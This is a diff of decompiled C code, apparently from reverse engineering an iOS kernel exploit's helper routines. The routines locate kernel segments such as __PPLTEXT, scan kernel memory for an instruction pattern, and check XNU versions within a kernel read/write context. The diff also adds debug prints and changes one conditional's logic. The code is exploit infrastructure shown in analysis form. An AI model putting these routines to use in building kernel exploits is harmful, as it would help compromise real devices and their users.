@@ -244,7 +244,7 @@ __int64 __fastcall sub_19AC4(__int64 a1, unsigned __int64 a2, unsigned __int64 a
 unsigned int __fastcall sub_19ACC(__int64 *a1, __int64 *a2);
 unsigned __int64 __fastcall sub_19B30(__int64 *a1, __int64 *a2);
 __int64 __fastcall sub_19B94(_QWORD, _QWORD); // weak
-void sub_19B98(const char *__s2, _QWORD *a2, __int64 a3);
+void __usercall sub_19B98(char *s2, __int64 a2, SearchObj *a3);
 __n128 macho_getsectbyname(char *seg, __int64 a2, const char *sect, _QWORD *a4);
 double sub_19D10(__int64 a1, _QWORD *a2);
 __int64 __fastcall sub_19D20(__int64 a1, char *__s2, unsigned __int64 a3);
@@ -644,7 +644,7 @@ __int64 __fastcall sub_39150(__int64 x0_0);
 unsigned __int64 __fastcall kernel_get_base_slid(struct_krwCtx *ctx, unsigned __int64 optional_vtable_func);
 __int64 __fastcall sub_39A24(__int64 a1, unsigned __int64 a2);
 unsigned __int64 __fastcall sub_39B14(_QWORD *a1);
-void sub_39B70(_QWORD *a1, struct_krwCtx *a2);
+void __usercall sub_39B70(SearchObj *x8_0, struct_krwCtx *a2);
 __int64 __fastcall sub_39CC0(struct_krwCtx *a1, task_name_t target_task, int a3, const void *a4, mach_vm_size_t a5);
 __int64 __fastcall create_pthread_something(__int64 a1, pthread_t *a2, __int64 a3, void *a4);
 bool __fastcall sub_39FDC(struct_krwCtx *someCtx, unsigned int a2, unsigned int a3);
@@ -16429,35 +16429,38 @@ unsigned __int64 __fastcall sub_19B30(__int64 *a1, __int64 *a2)
 // 8: using guessed type int dword_8;
 
 //----- (0000000000019B98) ----------------------------------------------------
-void sub_19B98(const char *__s2, _QWORD *a2, __int64 a3)
+void __usercall sub_19B98(char *s2, __int64 a2, SearchObj *a3)
 {
   __int64 v4; // x8
   unsigned __int64 v5; // x22
   __int64 v6; // x8
   unsigned __int64 v7; // x23
+  __int128 result; // q0
 
-  v4 = **(_QWORD **)(a3 + 208);
+  v4 = **(_QWORD **)(a2 + 208);
   v5 = v4 + 32;
   v6 = *(unsigned int *)(v4 + 20);
   v7 = v5 + v6;
   if ( v5 >= v5 + v6 )
   {
 LABEL_5:
-    *a2 = 0;
-    a2[1] = 0;
-    a2[2] = 0;
+    a3->field_0x00 = 0LL;
+    a3->base_ptr = 0LL;
+    a3->size = 0LL;
   }
   else
   {
-    while ( *(_DWORD *)v5 != 25 || strncmp((const char *)(v5 + 8), __s2, 0x10u) )
+    while ( *(_DWORD *)v5 != 25 || strncmp((const char *)(v5 + 8), s2, 0x10uLL) )
     {
       v5 += *(unsigned int *)(v5 + 4);
       if ( v5 >= v7 )
         goto LABEL_5;
     }
-    *a2 = a3;
-    *(__n128 *)(a2 + 1) = *(__n128 *)(v5 + 24);
+    a3->field_0x00 = a2;
+    result = *(_OWORD *)(v5 + 24);
+    *(_OWORD *)&a3->base_ptr = result;
   }
+  //return result;
 }
 
 //----- (0000000000019C34) ----------------------------------------------------
@@ -42420,58 +42423,111 @@ unsigned __int64 __fastcall sub_39B14(_QWORD *a1)
 }
 
 //----- (0000000000039B70) ----------------------------------------------------
-void sub_39B70(_QWORD *a1, struct_krwCtx *a2)
+void __usercall sub_39B70(SearchObj *x8_0, struct_krwCtx *a2)
 {
-  __int64 v4; // x10
-  __int64 v5; // x0
-  char *v6; // x0
-  char *v7; // x21
-  __int64 v8; // x8
-  __int64 v9; // x9
-  __int64 v10; // x8
-  __int128 v11; // [xsp+8h] [xbp-38h] BYREF
-  __int64 v12; // [xsp+18h] [xbp-28h]
+    __int64 base_ptr; // x9
+    __int64 size; // x10
+    __int64 v6; // x0
+    char *v7; // x0
+    unsigned __int64 v8; // x21
+    unsigned __int64 v9; // x8
+    __int64 v10; // x9
+    __int64 v11; // x8
+    SearchObj a1; // [xsp+8h] [xbp-38h] BYREF
 
-  *a1 = 0;
-  a1[1] = 0;
-  a1[2] = 0;
-  if ( krw_ctx_has_flag(a2, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
-    goto LABEL_2;
-  if ( krw_ctx_has_flag(a2, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
-  {
-    sub_19B98("__PPLTEXT", &v11, a2->gap1921[2]);
-    goto LABEL_5;
+    x8_0->field_0x00 = 0LL;
+    x8_0->base_ptr = 0LL;
+    x8_0->size = 0LL;
+    if ( krw_ctx_has_flag(a2, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
+      goto LABEL_2;
+    if ( krw_ctx_has_flag(a2, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
+    {
+      sub_19B98("__PPLTEXT", a2->gap1921[2], &a1);
+      goto LABEL_5;
+    }
+    sub_19D10(a2->gap1921[2], &a1.field_0x00);
+    base_ptr = a1.base_ptr;
+    size = a1.size;
+    if ( a2->xnuVersionPacked < XNU_VERSION_PACKED(7195, 100, 326, 0, 0) )
+    {
+      x8_0->field_0x00 = a1.field_0x00;
+      x8_0->base_ptr = base_ptr;
+      x8_0->size = size;
+      return;
+    }
+    a1.base_ptr = a1.base_ptr + a1.size - 0x20000;
+    a1.size = 0x20000LL;
+    v6 = kernel_pattern_scan(&a1, "08 DC 70 92", 0);
+    if ( !v6 )
+      goto LABEL_2;
+    v7 = sub_1E800((__int64 *)a2->gap1921[2], (__int64 *)(v6 - 4));
+    if ( !v7 )
+      goto LABEL_2;
+    v8 = (unsigned __int64)v7;
+    sub_19D10(a2->gap1921[2], &a1.field_0x00);
+    v9 = a1.base_ptr - v8;
+    if ( a1.base_ptr > v8
+      || (v10 = a1.size, v8 >= a1.size + a1.base_ptr)
+      || (x8_0->field_0x00 = a1.field_0x00, x8_0->base_ptr = v8, v11 = v9 + v10, (x8_0->size = v11) == 0) )
+    {
+  LABEL_2:
+      sub_19D10(a2->gap1921[2], &a1.field_0x00);
+  LABEL_5:
+      *x8_0 = a1;
+    }
   }
-  sub_19D10(a2->gap1921[2], &v11);
-  v4 = v12;
-  if ( a2->xnuVersionPacked < XNU_VERSION_PACKED(7195, 100, 326, 0, 0) )
-  {
-    *(_OWORD *)a1 = v11;
-    a1[2] = v4;
-    return;
-  }
-  *((_QWORD *)&v11 + 1) = *((_QWORD *)&v11 + 1) + v12 - 0x20000;
-  v12 = 0x20000;
-  v5 = kernel_pattern_scan((__int64)&v11, "08 DC 70 92", 0);
-  if ( !v5 )
-    goto LABEL_2;
-  v6 = sub_1E800((__int64 *)a2->gap1921[2], (__int64 *)(v5 - 4));
-  if ( !v6 )
-    goto LABEL_2;
-  v7 = v6;
-  sub_19D10(a2->gap1921[2], &v11);
-  v8 = *((_QWORD *)&v11 + 1) - (_QWORD)v7;
-  if ( *((_QWORD *)&v11 + 1) > (unsigned __int64)v7
-    || (v9 = v12, (unsigned __int64)v7 >= v12 + *((_QWORD *)&v11 + 1))
-    || (*a1 = v11, a1[1] = v7, v10 = v8 + v9, (a1[2] = v10) == 0) )
-  {
-LABEL_2:
-    sub_19D10(a2->gap1921[2], &v11);
-LABEL_5:
-    *(_OWORD *)a1 = v11;
-    a1[2] = v12;
-  }
-}
+//void sub_39B70(_QWORD *a1, struct_krwCtx *a2)
+//{
+//  __int64 v4; // x10
+//  __int64 v5; // x0
+//  char *v6; // x0
+//  char *v7; // x21
+//  __int64 v8; // x8
+//  __int64 v9; // x9
+//  __int64 v10; // x8
+//  __int128 v11; // [xsp+8h] [xbp-38h] BYREF
+//  __int64 v12; // [xsp+18h] [xbp-28h]
+//
+//  *a1 = 0;
+//  a1[1] = 0;
+//  a1[2] = 0;
+//  if ( krw_ctx_has_flag(a2, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
+//    goto LABEL_2;
+//  if ( krw_ctx_has_flag(a2, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
+//  {
+//    sub_19B98("__PPLTEXT", &v11, a2->gap1921[2]);
+//    goto LABEL_5;
+//  }
+//  sub_19D10(a2->gap1921[2], &v11);
+//  v4 = v12;
+//  if ( a2->xnuVersionPacked < XNU_VERSION_PACKED(7195, 100, 326, 0, 0) )
+//  {
+//    *(_OWORD *)a1 = v11;
+//    a1[2] = v4;
+//    return;
+//  }
+//  *((_QWORD *)&v11 + 1) = *((_QWORD *)&v11 + 1) + v12 - 0x20000;
+//  v12 = 0x20000;
+//  v5 = kernel_pattern_scan((__int64)&v11, "08 DC 70 92", 0);
+//  if ( !v5 )
+//    goto LABEL_2;
+//  v6 = sub_1E800((__int64 *)a2->gap1921[2], (__int64 *)(v5 - 4));
+//  if ( !v6 )
+//    goto LABEL_2;
+//  v7 = v6;
+//  sub_19D10(a2->gap1921[2], &v11);
+//  v8 = *((_QWORD *)&v11 + 1) - (_QWORD)v7;
+//  if ( *((_QWORD *)&v11 + 1) > (unsigned __int64)v7
+//    || (v9 = v12, (unsigned __int64)v7 >= v12 + *((_QWORD *)&v11 + 1))
+//    || (*a1 = v11, a1[1] = v7, v10 = v8 + v9, (a1[2] = v10) == 0) )
+//  {
+//LABEL_2:
+//    sub_19D10(a2->gap1921[2], &v11);
+//LABEL_5:
+//    *(_OWORD *)a1 = v11;
+//    a1[2] = v12;
+//  }
+//}
 
 //----- (0000000000039CC0) ----------------------------------------------------
 __int64 __fastcall sub_39CC0(struct_krwCtx *a1, task_name_t target_task, int a3, const void *a4, mach_vm_size_t a5)
@@ -43900,9 +43956,8 @@ int sub_3B7E0(struct_krwCtx *ctx, task_inspect_t task, mach_port_t a3)
                 return 0;
 
             // Version check again
-            if (ctx->xnuVersionPacked > ver_threshold_new) {
-                if (!sub_35FD8(ctx, obj))
-                    return 0;  // cbnz → return 0
+            if (ctx->xnuVersionPacked > ver_threshold_new && sub_35FD8(ctx, obj)) {
+                return 0;  // cbnz → return 0
             }
 
             // validate_addr(ctx, ctx->field_0x398)
@@ -43980,8 +44035,12 @@ int sub_3B7E0(struct_krwCtx *ctx, task_inspect_t task, mach_port_t a3)
 
             cnt = 8;
             audit_token_t audit_token = {0};
-            if (task_info(task, 0xF, (task_info_t)&audit_token, &cnt))
+            printf("-------- before info ----------\n");
+            if (task_info(task, 0xF, (task_info_t)&audit_token, &cnt)) {
+                printf("-------- failed info ----------\n");
                 return 0;
+            }
+            printf("-------- successs info ----------\n");
 
             security_token_t sec_token = *(security_token_t *)task_info_out;
             // Copy audit_token to local (ldp q0,q1 / stp q0,q1)
